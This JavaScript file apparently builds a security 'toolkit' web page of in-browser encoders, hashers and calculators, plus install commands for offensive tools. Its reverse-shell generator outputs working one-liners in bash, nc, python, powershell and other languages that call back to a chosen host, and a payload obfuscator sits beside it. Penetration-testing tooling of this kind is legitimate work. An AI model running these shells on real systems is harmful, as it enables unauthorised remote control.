// Sentinel toolkit. "browser" tools run 100% in-page and actually work.
// "local" tools run on the user's own machine (a website can't), so they show an
// install command. renderTools() (tools.js) builds the searchable catalog + modal.

const enc = new TextEncoder();
const hexOf = (buf) => [...new Uint8Array(buf)].map((b) => b.toString(16).padStart(2, "0")).join("");
const b64e = (s) => btoa(unescape(encodeURIComponent(s)));
const b64d = (s) => decodeURIComponent(escape(atob(s.trim())));
const rot13 = (s) => s.replace(/[a-z]/gi, (c) => String.fromCharCode((c <= "Z" ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26));

// Standard input -> transform -> output tool.
function io(root, ops, ph = "Input") {
  root.innerHTML = `
    <textarea class="tk-in" rows="4" placeholder="${ph}"></textarea>
    <div class="tk-btns">${ops.map((o, i) => `<button class="btn sm" data-i="${i}">${o.label}</button>`).join("")}</div>
    <pre class="tk-out"></pre>`;
  const inp = root.querySelector(".tk-in"), out = root.querySelector(".tk-out");
  root.querySelector(".tk-btns").onclick = async (e) => {
    const b = e.target.closest("button[data-i]"); if (!b) return;
    try { out.textContent = await ops[+b.dataset.i].fn(inp.value); }
    catch (err) { out.textContent = "Error: " + err.message; }
  };
}

// ---- browser tool implementations ----
const B = {
  base64: (r) => io(r, [{ label: "Encode", fn: b64e }, { label: "Decode", fn: b64d }]),
  url: (r) => io(r, [{ label: "Encode", fn: (s) => encodeURIComponent(s) }, { label: "Decode", fn: (s) => decodeURIComponent(s) }]),
  hex: (r) => io(r, [
    { label: "Text -> Hex", fn: (s) => [...enc.encode(s)].map((b) => b.toString(16).padStart(2, "0")).join(" ") },
    { label: "Hex -> Text", fn: (s) => new TextDecoder().decode(new Uint8Array(s.trim().split(/\s+/).map((h) => parseInt(h, 16)))) },
  ]),
  html: (r) => io(r, [
    { label: "Encode", fn: (s) => s.replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c])) },
    { label: "Decode", fn: (s) => { const t = document.createElement("textarea"); t.innerHTML = s; return t.value; } },
  ]),
  rot13: (r) => io(r, [{ label: "ROT13", fn: rot13 }]),
  case: (r) => io(r, [
    { label: "UPPER", fn: (s) => s.toUpperCase() }, { label: "lower", fn: (s) => s.toLowerCase() },
    { label: "Title", fn: (s) => s.replace(/\w\S*/g, (w) => w[0].toUpperCase() + w.slice(1).toLowerCase()) },
    { label: "snake_case", fn: (s) => s.trim().replace(/\s+/g, "_").toLowerCase() },
    { label: "kebab-case", fn: (s) => s.trim().replace(/\s+/g, "-").toLowerCase() },
  ]),
  hash: (r) => io(r, ["SHA-1", "SHA-256", "SHA-384", "SHA-512"].map((a) => ({
    label: a, fn: async (s) => a + ": " + hexOf(await crypto.subtle.digest(a, enc.encode(s))),
  })), "Text to hash"),
  jwt: (r) => io(r, [{ label: "Decode", fn: (s) => {
    const p = s.trim().split("."); if (p.length < 2) throw new Error("not a JWT");
    const d = (x) => JSON.stringify(JSON.parse(b64d(x.replace(/-/g, "+").replace(/_/g, "/"))), null, 2);
    return "HEADER\n" + d(p[0]) + "\n\nPAYLOAD\n" + d(p[1]);
  } }], "Paste a JWT (header.payload.signature)"),
  obfuscate: (r) => io(r, [
    { label: "Base64", fn: b64e },
    { label: "Hex \\xNN", fn: (s) => [...enc.encode(s)].map((b) => "\\x" + b.toString(16).padStart(2, "0")).join("") },
    { label: "URL", fn: (s) => [...enc.encode(s)].map((b) => "%" + b.toString(16).padStart(2, "0")).join("") },
    { label: "Unicode", fn: (s) => [...s].map((c) => "\\u" + c.charCodeAt(0).toString(16).padStart(4, "0")).join("") },
  ], "Payload to obfuscate"),
  baseconv: (r) => io(r, [
    { label: "-> bin", fn: (s) => parseInt(s.trim()).toString(2) }, { label: "-> oct", fn: (s) => parseInt(s.trim()).toString(8) },
    { label: "-> hex", fn: (s) => parseInt(s.trim()).toString(16) }, { label: "hex -> dec", fn: (s) => parseInt(s.trim(), 16).toString(10) },
    { label: "bin -> dec", fn: (s) => parseInt(s.trim(), 2).toString(10) },
  ], "A number"),

  revshell: (r) => {
    r.innerHTML = `
      <div class="tk-row"><input class="tk-f" id="rs-ip" placeholder="LHOST e.g. 10.0.0.1" value="10.0.0.1">
      <input class="tk-f" id="rs-port" placeholder="LPORT" value="4444" style="max-width:110px"></div>
      <div class="tk-btns" id="rs-langs"></div><pre class="tk-out" id="rs-out"></pre>`;
    const langs = {
      bash: (i, p) => `bash -i >& /dev/tcp/${i}/${p} 0>&1`,
      "bash UDP": (i, p) => `sh -i >& /dev/udp/${i}/${p} 0>&1`,
      nc: (i, p) => `nc -e /bin/sh ${i} ${p}`,
      "nc mkfifo": (i, p) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${i} ${p} >/tmp/f`,
      python3: (i, p) => `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${i}",${p}));[os.dup2(s.fileno(),f) for f in(0,1,2)];import pty;pty.spawn("/bin/sh")'`,
      php: (i, p) => `php -r '$s=fsockopen("${i}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'`,
      perl: (i, p) => `perl -e 'use Socket;$i="${i}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'`,
      powershell: (i, p) => `powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('${i}',${p});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($n=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$n);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}"`,
      ruby: (i, p) => `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${i}","${p}");loop{c.write(\`#{c.gets}\`)}'`,
    };
    r.querySelector("#rs-langs").innerHTML = Object.keys(langs).map((l) => `<button class="btn sm" data-l="${l}">${l}</button>`).join("");
    r.querySelector("#rs-langs").onclick = (e) => {
      const b = e.target.closest("button[data-l]"); if (!b) return;
      const i = r.querySelector("#rs-ip").value.trim(), p = r.querySelector("#rs-port").value.trim();
      r.querySelector("#rs-out").textContent = langs[b.dataset.l](i, p);
    };
  },

  subnet: (r) => io(r, [{ label: "Calculate", fn: (s) => {
    const [ip, bs] = s.trim().split("/"); const bits = +bs, oct = (ip || "").split(".").map(Number);
    if (oct.length !== 4 || oct.some((o) => !(o >= 0 && o <= 255)) || !(bits >= 0 && bits <= 32)) throw new Error("bad CIDR, e.g. 192.168.1.0/24");
    const ipn = oct.reduce((a, o) => a * 256 + o, 0) >>> 0, mask = bits === 0 ? 0 : (0xFFFFFFFF << (32 - bits)) >>> 0;
    const net = (ipn & mask) >>> 0, bc = (net | (~mask >>> 0)) >>> 0, toIp = (n) => [24, 16, 8, 0].map((s2) => (n >>> s2) & 255).join(".");
    const hosts = bits >= 31 ? 0 : bc - net - 1;
    return `Network:    ${toIp(net)}\nBroadcast:  ${toIp(bc)}\nNetmask:    ${toIp(mask)}  (/${bits})\nFirst host: ${bits >= 31 ? "n/a" : toIp(net + 1)}\nLast host:  ${bits >= 31 ? "n/a" : toIp(bc - 1)}\nUsable:     ${hosts}`;
  } }], "CIDR e.g. 192.168.1.0/24"),

  passgen: (r) => {
    r.innerHTML = `
      <div class="tk-row">Length <input class="tk-f" id="pg-len" type="number" value="20" min="4" max="128" style="max-width:90px">
      <label><input type="checkbox" id="pg-sym" checked> symbols</label></div>
      <div class="tk-btns"><button class="btn sm" id="pg-go">Generate</button></div><pre class="tk-out" id="pg-out"></pre>`;
    r.querySelector("#pg-go").onclick = () => {
      const n = Math.max(4, Math.min(128, +r.querySelector("#pg-len").value || 20));
      let cs = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
      if (r.querySelector("#pg-sym").checked) cs += "!@#$%^&*()-_=+[]{};:,.?";
      const a = crypto.getRandomValues(new Uint32Array(n));
      r.querySelector("#pg-out").textContent = [...a].map((x) => cs[x % cs.length]).join("");
    };
  },
  uuid: (r) => { r.innerHTML = `<div class="tk-btns"><button class="btn sm" id="u-go">Generate UUID v4</button></div><pre class="tk-out" id="u-out"></pre>`;
    r.querySelector("#u-go").onclick = () => { r.querySelector("#u-out").textContent = crypto.randomUUID(); }; },
  epoch: (r) => io(r, [
    { label: "Now (epoch)", fn: () => Math.floor(Date.now() / 1000) + "" },
    { label: "Epoch -> date", fn: (s) => new Date(+s.trim() * (s.trim().length > 11 ? 1 : 1000)).toString() },
  ], "Unix timestamp"),
};

// ---- extra browser tools ----
const hexToHsl = (hex) => {
  hex = hex.replace("#", "");
  const r = parseInt(hex.slice(0, 2), 16) / 255, g = parseInt(hex.slice(2, 4), 16) / 255, b = parseInt(hex.slice(4, 6), 16) / 255;
  const mx = Math.max(r, g, b), mn = Math.min(r, g, b); let h = 0, s = 0, l = (mx + mn) / 2;
  if (mx !== mn) { const d = mx - mn; s = l > .5 ? d / (2 - mx - mn) : d / (mx + mn); h = mx === r ? (g - b) / d + (g < b ? 6 : 0) : mx === g ? (b - r) / d + 2 : (r - g) / d + 4; h /= 6; }
  return `hsl(${Math.round(h * 360)}, ${Math.round(s * 100)}%, ${Math.round(l * 100)}%)`;
};
const MORSE = { A: ".-", B: "-...", C: "-.-.", D: "-..", E: ".", F: "..-.", G: "--.", H: "....", I: "..", J: ".---", K: "-.-", L: ".-..", M: "--", N: "-.", O: "---", P: ".--.", Q: "--.-", R: ".-.", S: "...", T: "-", U: "..-", V: "...-", W: ".--", X: "-..-", Y: "-.--", Z: "--..", "0": "-----", "1": ".----", "2": "..---", "3": "...--", "4": "....-", "5": ".....", "6": "-....", "7": "--...", "8": "---..", "9": "----." };
const MORSE_R = Object.fromEntries(Object.entries(MORSE).map(([k, v]) => [v, k]));
const B32 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
function base32enc(s) { let bits = ""; for (const b of enc.encode(s)) bits += b.toString(2).padStart(8, "0"); let out = ""; for (let i = 0; i < bits.length; i += 5) out += B32[parseInt(bits.slice(i, i + 5).padEnd(5, "0"), 2)]; while (out.length % 8) out += "="; return out; }
function base32dec(s) { s = s.replace(/=+$/, "").toUpperCase(); let bits = ""; for (const c of s) { const v = B32.indexOf(c); if (v >= 0) bits += v.toString(2).padStart(5, "0"); } let out = ""; for (let i = 0; i + 8 <= bits.length; i += 8) out += String.fromCharCode(parseInt(bits.slice(i, i + 8), 2)); return out; }

B.jsonfmt = (r) => io(r, [{ label: "Format", fn: (s) => JSON.stringify(JSON.parse(s), null, 2) }, { label: "Minify", fn: (s) => JSON.stringify(JSON.parse(s)) }], "Paste JSON");
B.csvjson = (r) => io(r, [{ label: "CSV -> JSON", fn: (s) => { const rows = s.trim().split(/\r?\n/).map((l) => l.split(",")); const head = rows.shift().map((h) => h.trim()); return JSON.stringify(rows.map((rw) => Object.fromEntries(head.map((h, i) => [h, (rw[i] || "").trim()]))), null, 2); } }], "header row, then data rows");
B.unicode = (r) => io(r, [{ label: "Code points", fn: (s) => [...s].map((c) => c + "  U+" + c.codePointAt(0).toString(16).toUpperCase().padStart(4, "0")).join("\n") }]);
B.base32 = (r) => io(r, [{ label: "Encode", fn: base32enc }, { label: "Decode", fn: base32dec }]);
B.binary = (r) => io(r, [{ label: "Text -> Binary", fn: (s) => [...enc.encode(s)].map((b) => b.toString(2).padStart(8, "0")).join(" ") }, { label: "Binary -> Text", fn: (s) => new TextDecoder().decode(new Uint8Array(s.trim().split(/\s+/).map((b) => parseInt(b, 2)))) }]);
B.morse = (r) => io(r, [{ label: "Text -> Morse", fn: (s) => s.toUpperCase().split("").map((c) => c === " " ? "/" : (MORSE[c] || "")).join(" ").trim() }, { label: "Morse -> Text", fn: (s) => s.trim().split(" ").map((c) => c === "/" ? " " : (MORSE_R[c] || "")).join("") }]);
B.jsescape = (r) => io(r, [{ label: "Escape", fn: (s) => JSON.stringify(s).slice(1, -1) }, { label: "Unescape", fn: (s) => JSON.parse('"' + s.replace(/"/g, '\\"') + '"') }]);
B.caesar = (r) => { r.innerHTML = `<div class="tk-row">Shift <input class="tk-f" id="cz-n" type="number" value="3" style="max-width:90px"></div><textarea class="tk-in" id="cz-in" rows="3" placeholder="Text"></textarea><div class="tk-btns"><button class="btn sm" id="cz-go">Shift</button></div><pre class="tk-out" id="cz-out"></pre>`; r.querySelector("#cz-go").onclick = () => { const n = ((+r.querySelector("#cz-n").value % 26) + 26) % 26; r.querySelector("#cz-out").textContent = r.querySelector("#cz-in").value.replace(/[a-z]/gi, (c) => { const base = c <= "Z" ? 65 : 97; return String.fromCharCode((c.charCodeAt(0) - base + n) % 26 + base); }); }; };
B.xor = (r) => { r.innerHTML = `<div class="tk-row">Key <input class="tk-f" id="xr-k" placeholder="key"></div><textarea class="tk-in" id="xr-in" rows="3" placeholder="Text"></textarea><div class="tk-btns"><button class="btn sm" id="xr-go">XOR -> hex</button></div><pre class="tk-out" id="xr-out"></pre>`; r.querySelector("#xr-go").onclick = () => { const kb = enc.encode(r.querySelector("#xr-k").value || " "); r.querySelector("#xr-out").textContent = [...enc.encode(r.querySelector("#xr-in").value)].map((b, i) => (b ^ kb[i % kb.length]).toString(16).padStart(2, "0")).join(""); }; };
B.hmac = (r) => { r.innerHTML = `<div class="tk-row">Key <input class="tk-f" id="hm-k" placeholder="secret"></div><textarea class="tk-in" id="hm-in" rows="3" placeholder="Message"></textarea><div class="tk-btns"><button class="btn sm" id="hm-go">HMAC-SHA256</button></div><pre class="tk-out" id="hm-out"></pre>`; r.querySelector("#hm-go").onclick = async () => { try { const key = await crypto.subtle.importKey("raw", enc.encode(r.querySelector("#hm-k").value), { name: "HMAC", hash: "SHA-256" }, false, ["sign"]); r.querySelector("#hm-out").textContent = hexOf(await crypto.subtle.sign("HMAC", key, enc.encode(r.querySelector("#hm-in").value))); } catch (e) { r.querySelector("#hm-out").textContent = "Error: " + e.message; } }; };
B.entropy = (r) => io(r, [{ label: "Shannon entropy", fn: (s) => { if (!s) return "0"; const f = {}; for (const c of s) f[c] = (f[c] || 0) + 1; let e = 0; for (const k in f) { const p = f[k] / s.length; e -= p * Math.log2(p); } return e.toFixed(4) + " bits/char  (" + (e * s.length).toFixed(1) + " bits total)"; } }]);
B.slug = (r) => io(r, [{ label: "Slugify", fn: (s) => s.toLowerCase().trim().replace(/[^a-z0-9]+/g, "-").replace(/^-+|-+$/g, "") }]);
B.wordcount = (r) => io(r, [{ label: "Count", fn: (s) => `Characters: ${s.length}\nWords: ${(s.trim().match(/\S+/g) || []).length}\nLines: ${s.split(/\n/).length}` }]);
B.lorem = (r) => { const W = "lorem ipsum dolor sit amet consectetur adipiscing elit sed do eiusmod tempor incididunt ut labore et dolore magna aliqua enim ad minim veniam quis nostrud".split(" "); r.innerHTML = `<div class="tk-row">Paragraphs <input class="tk-f" id="lo-n" type="number" value="2" min="1" max="10" style="max-width:90px"></div><div class="tk-btns"><button class="btn sm" id="lo-go">Generate</button></div><pre class="tk-out" id="lo-out"></pre>`; r.querySelector("#lo-go").onclick = () => { const n = Math.max(1, Math.min(10, +r.querySelector("#lo-n").value || 2)); const p = () => Array.from({ length: 40 }, () => W[Math.floor(Math.random() * W.length)]).join(" "); r.querySelector("#lo-out").textContent = Array.from({ length: n }, p).join("\n\n"); }; };
B.regex = (r) => { r.innerHTML = `<div class="tk-row"><input class="tk-f" id="rx-p" placeholder="pattern e.g. \\d+"><input class="tk-f" id="rx-f" placeholder="flags" value="g" style="max-width:80px"></div><textarea class="tk-in" id="rx-in" rows="4" placeholder="Test string"></textarea><div class="tk-btns"><button class="btn sm" id="rx-go">Match</button></div><pre class="tk-out" id="rx-out"></pre>`; r.querySelector("#rx-go").onclick = () => { try { const re = new RegExp(r.querySelector("#rx-p").value, r.querySelector("#rx-f").value); const m = [...r.querySelector("#rx-in").value.matchAll(re)]; r.querySelector("#rx-out").textContent = m.length ? m.map((x, i) => `${i}: ${x[0]}`).join("\n") : "no matches"; } catch (e) { r.querySelector("#rx-out").textContent = "Error: " + e.message; } }; };
B.color = (r) => io(r, [{ label: "Hex -> RGB", fn: (s) => { const n = parseInt(s.trim().replace("#", ""), 16); return `rgb(${(n >> 16) & 255}, ${(n >> 8) & 255}, ${n & 255})`; } }, { label: "Hex -> HSL", fn: (s) => hexToHsl(s.trim()) }], "#00d4ff");
B.ip2int = (r) => io(r, [{ label: "IP -> int", fn: (s) => String(s.trim().split(".").reduce((a, o) => a * 256 + (+o), 0) >>> 0) }, { label: "int -> IP", fn: (s) => { const n = (+s.trim()) >>> 0; return [24, 16, 8, 0].map((sh) => (n >>> sh) & 255).join("."); } }], "192.168.1.1");

// id, name, category, kind, desc, and (browser) render / (local) install command.
export const CATALOG = [
  // --- browser (work in-page) ---
  { id: "base64", name: "Base64", cat: "Encoding", kind: "browser", desc: "Encode / decode Base64", render: B.base64 },
  { id: "url", name: "URL encode", cat: "Encoding", kind: "browser", desc: "Percent-encode / decode", render: B.url },
  { id: "hex", name: "Hex converter", cat: "Encoding", kind: "browser", desc: "Text <-> hex bytes", render: B.hex },
  { id: "html", name: "HTML entities", cat: "Encoding", kind: "browser", desc: "Encode / decode HTML entities", render: B.html },
  { id: "baseconv", name: "Base converter", cat: "Encoding", kind: "browser", desc: "bin / oct / dec / hex", render: B.baseconv },
  { id: "rot13", name: "ROT13", cat: "Crypto", kind: "browser", desc: "ROT13 cipher", render: B.rot13 },
  { id: "hash", name: "Hash generator", cat: "Crypto", kind: "browser", desc: "SHA-1/256/384/512", render: B.hash },
  { id: "jwt", name: "JWT decoder", cat: "Crypto", kind: "browser", desc: "Decode a JWT's header + payload", render: B.jwt },
  { id: "case", name: "Case converter", cat: "Text", kind: "browser", desc: "UPPER / lower / Title / snake / kebab", render: B.case },
  { id: "passgen", name: "Password generator", cat: "Text", kind: "browser", desc: "Strong random password", render: B.passgen },
  { id: "uuid", name: "UUID generator", cat: "Text", kind: "browser", desc: "Random UUID v4", render: B.uuid },
  { id: "epoch", name: "Epoch converter", cat: "Text", kind: "browser", desc: "Unix time <-> date", render: B.epoch },
  { id: "subnet", name: "Subnet calculator", cat: "Network", kind: "browser", desc: "CIDR -> network / range / hosts", render: B.subnet },
  { id: "revshell", name: "Reverse shell", cat: "Payloads", kind: "browser", desc: "Reverse-shell one-liners, 9 flavors", render: B.revshell },
  { id: "obfuscate", name: "Payload obfuscator", cat: "Payloads", kind: "browser", desc: "Base64 / hex / url / unicode", render: B.obfuscate },
  { id: "jsonfmt", name: "JSON formatter", cat: "Data", kind: "browser", desc: "Pretty-print or minify JSON", render: B.jsonfmt },
  { id: "csvjson", name: "CSV to JSON", cat: "Data", kind: "browser", desc: "Convert CSV into JSON", render: B.csvjson },
  { id: "unicode", name: "Unicode inspector", cat: "Data", kind: "browser", desc: "Character code points", render: B.unicode },
  { id: "color", name: "Color converter", cat: "Data", kind: "browser", desc: "Hex to RGB / HSL", render: B.color },
  { id: "base32", name: "Base32", cat: "Encoding", kind: "browser", desc: "Encode / decode Base32", render: B.base32 },
  { id: "binary", name: "Binary", cat: "Encoding", kind: "browser", desc: "Text and binary", render: B.binary },
  { id: "morse", name: "Morse code", cat: "Encoding", kind: "browser", desc: "Text and Morse", render: B.morse },
  { id: "jsescape", name: "JS string escape", cat: "Encoding", kind: "browser", desc: "Escape / unescape", render: B.jsescape },
  { id: "caesar", name: "Caesar cipher", cat: "Crypto", kind: "browser", desc: "Shift cipher", render: B.caesar },
  { id: "xor", name: "XOR cipher", cat: "Crypto", kind: "browser", desc: "XOR a key over text", render: B.xor },
  { id: "hmac", name: "HMAC-SHA256", cat: "Crypto", kind: "browser", desc: "Keyed hash", render: B.hmac },
  { id: "entropy", name: "Entropy", cat: "Crypto", kind: "browser", desc: "Shannon entropy of text", render: B.entropy },
  { id: "regex", name: "Regex tester", cat: "Text", kind: "browser", desc: "Test a regular expression", render: B.regex },
  { id: "slug", name: "Slugify", cat: "Text", kind: "browser", desc: "URL-friendly slug", render: B.slug },
  { id: "wordcount", name: "Word counter", cat: "Text", kind: "browser", desc: "Chars / words / lines", render: B.wordcount },
  { id: "lorem", name: "Lorem ipsum", cat: "Text", kind: "browser", desc: "Placeholder text", render: B.lorem },
  { id: "ip2int", name: "IP and integer", cat: "Network", kind: "browser", desc: "IPv4 to integer and back", render: B.ip2int },

  // --- setup (install locally) ---
  { id: "vscode", name: "VS Code", cat: "Setup", kind: "local", desc: "Code editor", cmd: "sudo snap install code --classic" },
  { id: "git", name: "Git", cat: "Setup", kind: "local", desc: "Version control", cmd: "sudo apt install -y git" },
  { id: "python", name: "Python", cat: "Setup", kind: "local", desc: "Language + pip", cmd: "sudo apt install -y python3 python3-pip" },
  { id: "node", name: "Node.js", cat: "Setup", kind: "local", desc: "JS runtime + npm", cmd: "sudo apt install -y nodejs npm" },
  { id: "ollama", name: "Ollama", cat: "Setup", kind: "local", desc: "Local LLM runner", cmd: "curl -fsSL https://ollama.com/install.sh | sh" },

  // --- local (run on your machine; a website can't) ---
  ...[
    ["nmap", "Nmap", "Recon", "Port/service scanner", "sudo apt install -y nmap"],
    ["masscan", "masscan", "Recon", "Mass IP port scanner", "sudo apt install -y masscan"],
    ["rustscan", "RustScan", "Recon", "Fast port scanner", "sudo apt install -y rustscan"],
    ["subfinder", "subfinder", "Recon", "Subdomain discovery", "go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"],
    ["amass", "amass", "Recon", "Attack-surface mapping", "sudo apt install -y amass"],
    ["theharvester", "theHarvester", "Recon", "OSINT emails/hosts", "sudo apt install -y theharvester"],
    ["httpx", "httpx", "Recon", "HTTP probing", "go install github.com/projectdiscovery/httpx/cmd/httpx@latest"],
    ["gobuster", "gobuster", "Web", "Dir/vhost brute", "sudo apt install -y gobuster"],
    ["ffuf", "ffuf", "Web", "Web fuzzer", "sudo apt install -y ffuf"],
    ["feroxbuster", "feroxbuster", "Web", "Content discovery", "sudo apt install -y feroxbuster"],
    ["nikto", "Nikto", "Web", "Web server scanner", "sudo apt install -y nikto"],
    ["wafw00f", "wafw00f", "Web", "WAF fingerprint", "sudo apt install -y wafw00f"],
    ["sqlmap", "sqlmap", "Web", "SQLi automation", "sudo apt install -y sqlmap"],
    ["dalfox", "Dalfox", "Web", "XSS scanner", "go install github.com/hahwul/dalfox/v2@latest"],
    ["katana", "katana", "Web", "Crawler", "go install github.com/projectdiscovery/katana/cmd/katana@latest"],
    ["hydra", "hydra", "Passwords", "Login brute-forcer", "sudo apt install -y hydra"],
    ["hashcat", "hashcat", "Passwords", "GPU hash cracking", "sudo apt install -y hashcat"],
    ["john", "John the Ripper", "Passwords", "Password cracker", "sudo apt install -y john"],
    ["crackmapexec", "CrackMapExec", "Passwords", "AD/SMB sweep", "pipx install crackmapexec"],
    ["metasploit", "Metasploit", "Exploitation", "Exploit framework", "sudo apt install -y metasploit-framework"],
    ["searchsploit", "searchsploit", "Exploitation", "Exploit-DB search", "sudo apt install -y exploitdb"],
    ["impacket", "impacket", "Post-ex", "Windows/AD tooling", "pipx install impacket"],
    ["linpeas", "LinPEAS", "Post-ex", "Linux privesc audit", "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh"],
    ["aircrack", "aircrack-ng", "Wireless", "Wi-Fi cracking suite", "sudo apt install -y aircrack-ng"],
    ["wifite", "wifite", "Wireless", "Automated Wi-Fi attacks", "sudo apt install -y wifite"],
    ["proxychains", "proxychains", "Anonymity", "Route tools via proxy", "sudo apt install -y proxychains4"],
    ["tor", "Tor", "Anonymity", "Onion routing", "sudo apt install -y tor"],
    ["dnsx", "dnsx", "Recon", "Fast DNS toolkit", "go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest"],
    ["assetfinder", "assetfinder", "Recon", "Find related domains", "go install github.com/tomnomnom/assetfinder@latest"],
    ["waybackurls", "waybackurls", "Recon", "Archived URL discovery", "go install github.com/tomnomnom/waybackurls@latest"],
    ["whatweb", "WhatWeb", "Recon", "Web tech fingerprint", "sudo apt install -y whatweb"],
    ["dnsrecon", "dnsrecon", "Recon", "DNS enumeration", "sudo apt install -y dnsrecon"],
    ["gitleaks", "Gitleaks", "Recon", "Find secrets in repos", "go install github.com/gitleaks/gitleaks/v8@latest"],
    ["arjun", "Arjun", "Web", "HTTP parameter discovery", "pipx install arjun"],
    ["dirb", "dirb", "Web", "Directory brute-forcer", "sudo apt install -y dirb"],
    ["wfuzz", "wfuzz", "Web", "Web fuzzer", "sudo apt install -y wfuzz"],
    ["nuclei", "nuclei", "Web", "Template-based scanner", "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"],
    ["commix", "commix", "Web", "Command-injection exploiter", "sudo apt install -y commix"],
    ["medusa", "medusa", "Passwords", "Parallel brute-forcer", "sudo apt install -y medusa"],
    ["patator", "patator", "Passwords", "Multi-purpose brute-forcer", "pipx install patator"],
    ["responder", "Responder", "Post-ex", "LLMNR/NBT-NS poisoner", "pipx install responder"],
    ["bloodhound", "BloodHound", "Post-ex", "AD attack-path mapping", "sudo apt install -y bloodhound"],
    ["wireshark", "Wireshark", "Sniffing", "Packet analyzer (GUI)", "sudo apt install -y wireshark"],
    ["tcpdump", "tcpdump", "Sniffing", "CLI packet capture", "sudo apt install -y tcpdump"],
    ["binwalk", "binwalk", "Forensics", "Firmware/file carving", "sudo apt install -y binwalk"],
    ["volatility", "Volatility 3", "Forensics", "Memory forensics", "pipx install volatility3"],
    ["exiftool", "ExifTool", "Forensics", "File metadata reader", "sudo apt install -y libimage-exiftool-perl"],
  ].map(([id, name, cat, desc, cmd]) => ({ id, name, cat, kind: "local", desc, cmd })),
];

export const CATEGORIES = [...new Set(CATALOG.map((t) => t.cat))];

// "..." menu: ways to spin up the real local environment (a website can't run tools).
export const MORE = [
  {
    id: "toolkit", name: "Prebuilt local toolkit",
    desc: "Install the full CLI toolkit + OpenSSH in one go, then use every tool (and your SSH terminal) on your own machine.",
    body: "sudo apt update && sudo apt install -y \\\n  nmap masscan sqlmap gobuster ffuf nikto hydra john hashcat \\\n  theharvester wafw00f aircrack-ng tor proxychains4 \\\n  openssh-client openssh-server",
  },
  {
    id: "aicoding", name: "Local AI coding (Ollama)",
    desc: "Run a coding model on your machine - in the terminal, or a web UI in your browser at localhost:3000.",
    body: "# install Ollama + a coding model\ncurl -fsSL https://ollama.com/install.sh | sh\nollama pull qwen2.5-coder\n\n# use it in the terminal:\nollama run qwen2.5-coder\n\n# or a browser UI at http://localhost:3000 :\ndocker run -d -p 3000:8080 -v open-webui:/app/backend/data \\\n  --name open-webui ghcr.io/open-webui/open-webui:main",
  },
];
